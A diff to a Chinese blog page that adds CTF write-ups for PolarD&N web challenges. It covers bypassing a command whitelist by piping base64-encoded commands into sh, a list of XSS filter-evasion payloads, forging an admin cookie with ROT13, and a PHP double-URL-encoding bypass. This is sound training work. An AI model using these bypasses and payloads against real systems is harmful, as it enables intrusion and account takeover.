@@ -53,8 +53,38 @@
 <meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/4-1.png">
 <meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/4-2.png">
 <meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/4-3.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/5-1.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/5-2.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/5-3.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/5-4.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/5-5.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/5-6.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/5-7.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/6-1.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/6-2.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/6-3.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/6-4.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/6-5.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/7-1.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/7-2.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/7-3.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/7-4.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/7-5.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/7-6.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/7-7.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/8-1.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/8-2.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/8-3.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/8-4.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/8-5.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/8-6.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/9-1.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/9-2.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/9-3.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/9-4.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2026/01/03/polar-web-easy-3/9-5.png">
 <meta property="article:published_time" content="2026-01-02T16:00:00.000Z">
-<meta property="article:modified_time" content="2026-01-23T13:45:07.024Z">
+<meta property="article:modified_time" content="2026-01-24T04:54:26.248Z">
 <meta property="article:author" content="linguo">
 <meta property="article:tag" content="polarD&amp;N">
 <meta name="twitter:card" content="summary_large_image">
@@ -251,7 +281,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          890 字
+          2.1k 字
         
       </span>
     
@@ -262,7 +292,7 @@
         
         
         
-          8 分钟
+          18 分钟
         
       </span>
     
@@ -371,6 +401,89 @@
 <p><img src="/2026/01/03/polar-web-easy-3/4-2.png" srcset="/img/loading.gif" lazyload></p>
 <p>我们将其改为 <code>yes</code> 重发就可以获得 flag</p>
 <p><img src="/2026/01/03/polar-web-easy-3/4-3.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="white"><a href="#white" class="headerlink" title="white"></a>white</h1><blockquote>
+<p>考查点：命令执行rce</p>
+</blockquote>
+<p>此题是一道命令执行 rce 题，题目给出了可用命令：<code>ls、pwd、whoami、date、echo、base64、sh</code>，同时过滤了很多危险函数、特殊字符、文件读取函数，限制非常多</p>
+<p><img src="/2026/01/03/polar-web-easy-3/5-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试 <code>ls /</code> 发现能够成功读取</p>
+<p><img src="/2026/01/03/polar-web-easy-3/5-2.png" srcset="/img/loading.gif" lazyload></p>
+<p>但是我们需要使用白名单中命令，没有 cat 这些读取命令，提示说可以使用 <code>allow:命令名</code> 添加命令，尝试后发现虽然添加到了白名单但是提示保存失败，还是使用不了</p>
+<p><img src="/2026/01/03/polar-web-easy-3/5-3.png" srcset="/img/loading.gif" lazyload></p>
+<p>继续尝试，输入 <code>flag</code> 发现过滤了一些目录</p>
+<p><img src="/2026/01/03/polar-web-easy-3/5-4.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试 **echo &#96;&#96;**，发现过滤了一些字符</p>
+<p>但是其中并没有过滤管道符 <code>|</code>，既如此我们就可以用管道符去拼接命令了</p>
+<p><img src="/2026/01/03/polar-web-easy-3/5-5.png" srcset="/img/loading.gif" lazyload></p>
+<p>观察题目所给白名单，我们看到有 <code>base64</code>、<code>sh</code> 可用，那么我们的思路就可以是将命令编码，先用 <code>echo</code> 进行输出，通过管道符传给 <code>base64</code> 进行解密，然后通过 <code>sh</code> 执行</p>
+<p>先用 <code>ls /</code> 进行尝试，其 <code>base64</code> 加密为：<code>bHMgLw==</code>，发现执行成功</p>
+<p><img src="/2026/01/03/polar-web-easy-3/5-6.png" srcset="/img/loading.gif" lazyload></p>
+<p>如此，我们就可以通过这个思路去绕过读取了，<code>cat /flag.php</code> 加密：<code>Y2F0IC9mbGFnLnBocA==</code></p>
+<p><img src="/2026/01/03/polar-web-easy-3/5-7.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="来个弹窗2-0"><a href="#来个弹窗2-0" class="headerlink" title="来个弹窗2.0"></a>来个弹窗2.0</h1><blockquote>
+<p>考查点：xss</p>
+</blockquote>
+<p>此题直接就是要我们进行 xss 弹窗</p>
+<p><img src="/2026/01/03/polar-web-easy-3/6-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试输入 <code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code> 发现 <code>&lt;/script&gt;</code> 被截断了</p>
+<p><img src="/2026/01/03/polar-web-easy-3/6-2.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试后发现是 <code>&lt;/</code> 及其后面的内容会被过滤，直到遇到第一个 <code>&gt;</code> 闭合</p>
+<p><img src="/2026/01/03/polar-web-easy-3/6-3.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们需要考虑输入的 <code>payload</code> 只要没有 <code>&lt;/&gt;</code> 就行，经过尝试，下面这些都是可以的</p>
+<blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sfsec/p/15178028.html">XSS过滤绕过总结</a></p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell">&lt;img src=1 onerror=alert(&quot;xss&quot;);&gt;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">竞争焦点，从而触发onblur事件</span><br>&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;<br><br>&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用open属性触发ontoggle事件，无需用户去触发</span><br>&lt;details open ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;<br><br>&lt;svg onload=alert(&quot;xss&quot;);&gt;<br><br>&lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;<br><br>&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;<br><br>&lt;audio src=x  onerror=alert(&quot;xss&quot;);&gt;<br><br>&lt;body/onload=alert(&quot;xss&quot;);&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发</span><br>&lt;body<br>onscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;<br></code></pre></td></tr></table></figure>
+
+<p>弹窗成功后获得提示</p>
+<p><img src="/2026/01/03/polar-web-easy-3/6-4.png" srcset="/img/loading.gif" lazyload></p>
+<p>通过搜图我们得知人物为：<code>冯克雷</code></p>
+<p><img src="/2026/01/03/polar-web-easy-3/6-5.png" srcset="/img/loading.gif" lazyload></p>
+<p>但是我们要的是他的全名，通过搜索发现其全名： <code>本萨姆</code>，md5 加密即得到 flag</p>
+<h1 id="help"><a href="#help" class="headerlink" title="help"></a>help</h1><blockquote>
+<p>考查点：</p>
+</blockquote>
+<p>访问链接，一看就是要闯关的题</p>
+<p><img src="/2026/01/03/polar-web-easy-3/7-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>需要过3关</p>
+<p><img src="/2026/01/03/polar-web-easy-3/7-2.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2026/01/03/polar-web-easy-3/7-3.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2026/01/03/polar-web-easy-3/7-4.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2026/01/03/polar-web-easy-3/7-5.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2026/01/03/polar-web-easy-3/7-6.png" srcset="/img/loading.gif" lazyload></p>
+<p>一眼 <code>base64</code>，解密即可</p>
+<p><img src="/2026/01/03/polar-web-easy-3/7-7.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="cookie欺骗2-0"><a href="#cookie欺骗2-0" class="headerlink" title="cookie欺骗2.0"></a>cookie欺骗2.0</h1><blockquote>
+<p>考查点：cookie伪造</p>
+</blockquote>
+<p>访问链接，是一个认证系统，有两个登录功能点，但<code>管理员界面</code>目前我们肯定是进不去的，登录界面给出了一个测试账号</p>
+<p><img src="/2026/01/03/polar-web-easy-3/8-1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2026/01/03/polar-web-easy-3/8-2.png" srcset="/img/loading.gif" lazyload></p>
+<p>用此凭证登录，然后进入管理员界面，提示需要管理员身份</p>
+<p><img src="/2026/01/03/polar-web-easy-3/8-3.png" srcset="/img/loading.gif" lazyload></p>
+<p>此时我们就需要查看 <code>cookie</code>，发现有 <code>auth</code>、<code>user</code>，但 <code>auth</code> 的值看起来奇奇怪怪的，看起来像是进行了某种<strong>加密</strong>，随波一下，发现是 <code>ROT13</code> 加密了，解密正好是 <code>user1</code></p>
+<p><img src="/2026/01/03/polar-web-easy-3/8-4.png" srcset="/img/loading.gif" lazyload></p>
+<p>到这里，我们就可以去构造 admin 凭证了，<code>ROT13</code> 加密 <code>admin</code>：<code>nqzva</code></p>
+<p><img src="/2026/01/03/polar-web-easy-3/8-5.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2026/01/03/polar-web-easy-3/8-6.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="uii"><a href="#uii" class="headerlink" title="uii"></a>uii</h1><blockquote>
+<p>考查点：php代码审计、双重URL编码绕过</p>
+</blockquote>
+<p>访问链接，需要我们回答图中咖啡种类</p>
+<p><img src="/2026/01/03/polar-web-easy-3/9-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>看看网页源码，发现是：<code>拿铁</code></p>
+<p><img src="/2026/01/03/polar-web-easy-3/9-2.png" srcset="/img/loading.gif" lazyload></p>
+<p>输入后跳转，得到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;uii&quot;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;uii&quot;</span>] === <span class="hljs-string">&quot;Yzz&quot;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;不正确&quot;</span>;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;uii&quot;</span>])) &#123;<br>    <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;uii&quot;</span>] = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;uii&quot;</span>]); <br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;uii&quot;</span>] == <span class="hljs-string">&quot;Yzz&quot;</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;提交正确!!!&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Flag:   &quot;</span>;<br>        <span class="hljs-keyword">exit</span>(); <br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>分析一下，需要我们以 GET 方式输入 <code>uii</code>，并且值不能是 <code>Yzz</code>，接着需要输入的值在 <code>urldecode</code> 后的值是 <code>Yzz</code></p>
+<p>我们要知道的是当浏览器请求一个 URL 时，参数会被 URL 编码，PHP在填充 <code>$_GET</code> 时，会自动进行一次 URL 解码，当我们传入 <code>Yzz</code>，PHP 得到的就是 <code>Yzz</code>；当我们传入 <code>Yzz</code> URL 编码后的值，浏览器自动解码后为 <code>Yzz</code>。这就会触发第一段代码的条件，结合后面第二个条件，在判断前会进行一次 URL 解密，于是我们可以通过双重编码进行绕过</p>
+<p><img src="/2026/01/03/polar-web-easy-3/9-3.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2026/01/03/polar-web-easy-3/9-4.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2026/01/03/polar-web-easy-3/9-5.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>注：此题有些怪，直接传入 <code>Yzz</code>，<code>%59%7A%7A</code> 可以直接通过</p>
+</blockquote>
 
                 
               </div>
